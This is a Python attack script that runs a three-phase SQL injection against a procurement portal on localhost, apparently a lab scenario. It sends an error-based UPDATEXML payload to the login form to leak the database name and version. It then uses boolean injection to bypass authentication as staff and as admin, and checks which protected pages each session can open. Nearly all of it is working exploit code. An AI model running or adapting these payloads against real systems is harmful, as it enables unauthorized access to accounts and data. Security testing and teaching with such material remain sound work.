#!/usr/bin/env python3
"""
Attacker Script – 3‑Phase Exploit for the Procurement Portal Scenario 1

Phases:
  1. Reconnaissance – error‑based SQLi to get DB name & version
  2. Staff attack – Boolean SQLi to log in as staff, then browse pages
  3. Admin attack – Boolean SQLi to log in as admin, then browse pages

"""

import requests
import time
import re


BASE_URL        = "http://localhost"         
LOGIN_URL       = f"{BASE_URL}/login.php"
DASHBOARD_URL   = f"{BASE_URL}/dashboard.php"
SEARCH_URL      = f"{BASE_URL}/supplier_search.php"
EMPLOYEES_URL   = f"{BASE_URL}/employees.php"
CONTRACTS_URL   = f"{BASE_URL}/contracts.php"
RESET_URL       = f"{BASE_URL}/"

USERNAME_FIELD  = "username"
PASSWORD_FIELD  = "password"


HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",  #
}

def log(msg: str):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

# ------------------------------------------------------------------
# PHASE 1: DATABASE FINGERPRINTING 
# ------------------------------------------------------------------
def error_based_sqli(session: requests.Session):
    """Phase 1 – Reconnaissance: extract DB name & version via LOGIN page."""
    log("\n[PHASE 1] Database Fingerprinting")
    
    # FIXED: Injecting into LOGIN page with POST
    payload = "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x3a,VERSION(),0x7e),1)#"
    
    login_data = {
        USERNAME_FIELD: payload,
        PASSWORD_FIELD: "anything"
    }
    
    resp = session.post(LOGIN_URL, data=login_data, headers=HEADERS, timeout=10)
    
    
    if "SQL Error" in resp.text:
        error_match = re.search(r"SQL Error:\s*(.*?)(?:\n|$)", resp.text, re.IGNORECASE)
        if error_match:
            error_msg = error_match.group(1)
            log(f"[+] SQL Error Found: {error_msg}")
            
            db_match = re.search(r'~([^~]+)~', error_msg)
            if db_match:
                info = db_match.group(1)
                log(f"[+] DATABASE INFO EXTRACTED: {info}")
                return
        else:
            xpath_match = re.search(r"XPATH syntax error.*?'(.*?)'", resp.text, re.IGNORECASE)
            if xpath_match:
                log(f"[+] XPATH Error Contains: {xpath_match.group(1)}")
    else:
        log("[-] No SQL error detected")
        log(f"[-] Response preview: {resp.text[:200]}")

# ------------------------------------------------------------------
# PHASE 2 & 3: LOGIN BYPASS
# ------------------------------------------------------------------
def boolean_sqli_login(session: requests.Session, role: str) -> bool:
    """Phase 2/3 – Log in using Boolean SQLi for a given role."""
    log(f"\n[PHASE {role.upper()}] Login Bypass")
    
    payload = f"' OR role='{role}'#"
    login_data = {
        USERNAME_FIELD: payload,
        PASSWORD_FIELD: "anything"
    }
    
    resp = session.post(LOGIN_URL, data=login_data, headers=HEADERS, allow_redirects=True)
    
    if resp.url.endswith("dashboard.php") or "dashboard" in resp.text.lower():
        log(f"[+] SUCCESS! Logged in as {role.upper()}")
        return True
    
    if role.lower() in resp.text.lower() and "Login failed" not in resp.text:
        log(f"[+] SUCCESS! Logged in as {role.upper()}")
        return True
    
    log(f"[-] Failed to login as {role.upper()}")
    return False

# ------------------------------------------------------------------
# ACCESS VERIFICATION 
# ------------------------------------------------------------------
def browse_pages(session: requests.Session, role: str):
    """Browse the pages after a successful login."""
    log(f"\n[VERIFYING {role.upper()} ACCESS]")
    
    pages = [
        ("Dashboard", DASHBOARD_URL),
        ("Supplier Search", SEARCH_URL),
        ("Employees", EMPLOYEES_URL),
        ("Contracts", CONTRACTS_URL),
    ]
    
    accessible = 0
    blocked = 0
    
    for name, url in pages:
        resp = session.get(url, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            log(f"[+] {name}: ACCESS GRANTED")
            accessible += 1
        elif resp.status_code == 403:
            log(f"[!] {name}: ACCESS DENIED (403)")
            blocked += 1
        else:
            log(f"[-] {name}: Status {resp.status_code}")
            blocked += 1
    
    log(f"[*] Summary: {accessible} accessible, {blocked} blocked")

def reset_to_home(session: requests.Session):
    log("\n[RESET] Returning to home")
    session.get(RESET_URL, headers=HEADERS, timeout=10)

# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
def main():
    log("[*] STARTING SQL INJECTION ATTACK")
    log("[*] Target: Procurement Portal")
    log("[*] " + "="*50)
    
    session = requests.Session()

    try:
        r = session.get(BASE_URL, headers=HEADERS, timeout=10)
        log(f"[+] Connected to {BASE_URL} – HTTP {r.status_code}")
    except Exception as e:
        log(f"[-] Could not reach {BASE_URL}: {e}")
        return

    # PHASE 1: Database fingerprinting
    error_based_sqli(session)

    # PHASE 2: Staff attack
    if boolean_sqli_login(session, "staff"):
        browse_pages(session, "staff")
        reset_to_home(session)

    # PHASE 3: Admin attack - fresh session
    session_admin = requests.Session()
    if boolean_sqli_login(session_admin, "admin"):
        browse_pages(session_admin, "admin")

    log("\n[*] " + "="*50)
    log("[+] ATTACK SEQUENCE COMPLETE")

if __name__ == "__main__":
    main()
